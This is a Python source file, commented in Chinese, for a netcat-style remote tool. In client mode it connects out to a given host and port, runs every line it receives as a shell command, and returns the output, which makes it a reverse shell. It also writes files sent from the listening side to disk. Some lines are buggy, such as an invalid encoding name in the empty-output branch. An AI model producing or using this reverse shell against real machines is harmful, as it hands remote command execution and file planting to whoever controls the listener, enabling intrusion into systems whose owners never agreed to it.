import sys
import socket
import getopt
import threading
import subprocess

# 全局变量
listen = False
target = ""
port = 0

def help():
    print("""
    python3 netcat.py -t target_host -p port
    -l --listen      开启监听
    eg：
    python3 netcat.py -t 192.168.1.1 -p 5555 -l 
    python3 netcat.py -t 192.168.1.1 -p 5555"
    开启shell后可通过
    upload_file=abc.txt 来上传文件
    """)
    sys.exit(0)

def client_sender():
    global upload
    global command
    # 创建socket连接
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        # 尝试连接到目标主机
        client.connect((target,port))
    
        client.send(bytes("connect success!",encoding="utf-8"))
        while True:
            cmd_buffer = bytes("",encoding="utf-8")
            while b"\n" not in cmd_buffer:
                cmd_buffer+=client.recv(4096)
            if 'upload_file=' in str(cmd_buffer): 
                upload_file = str(cmd_buffer).split('=')[1].split(',')[0]
                f = open(upload_file,'w')
                f.write(str(cmd_buffer).split('=')[2][0:-3])
                f.close()
                response = bytes('upload success!',encoding='utf-8')
            else:
                # 返还命令输出
                response = run_command(cmd_buffer)
            # 返回响应数据
            client.send(response)
    except:
        print("程序执行错误或用户主动退出！")

def server_loop():
    global target

    # 如果没有定义目标，那么要监听所有端口
    if not len(target):
        target = "0.0.0.0"

    # 创建socket连接
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(((target,port)))

    server.listen(5)

    while True:
        client_socket,addr = server.accept()
        # 给一个线程用来处理新的客户端
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

def run_command(command):
    # 换行
    command  = command.rstrip()
    # 运行命令返回输出
    try:
        command = str(command)[2:-1]
        output = subprocess.check_output(command,stderr = subprocess.STDOUT,shell=True)
        if output == b'':
            output = bytes('success',encoding="success")
    except:
        output = bytes("failed to execute command \n\r",encoding="utf-8")
    return output

def client_handler(client_socket):
     while True:
            recv_len = 1
            response = bytes("",encoding="utf-8")

            while recv_len:
                data = client_socket.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break
            
            print(response)

            # 等待更多输入
            buffer = input("> ")
            if 'upload_file=' in buffer:
                f = open(buffer.split('=')[1],'r')
                buffer += ',file_msg='
                buffer += f.read()
                f.close()
            buffer += '\n'
            buffer = bytes(buffer,encoding="utf-8")

            # 客户端发送数据
            client_socket.send(buffer)
            
def main():
    # 获取全局变量
    global listen
    global port
    global target
    
    # 获取用户输入的参数
    if not len(sys.argv[1:]):
        help()
    
    try:
        opts,args = getopt.getopt(sys.argv[1:],
        "hlt:p:",
        ["help","listen","target","port"])
    except:
        print("error!")

    for o,a in opts:
        if o in ("-h","--help"):
            help()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ('-t',"--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            print('您输入的参数有误！')
    
    # 判断是听还是发送数据
    if not listen and len(target) and port > 0:
        # 从命令行读取内存数据
        client_sender()
    if listen:
        server_loop()

main()
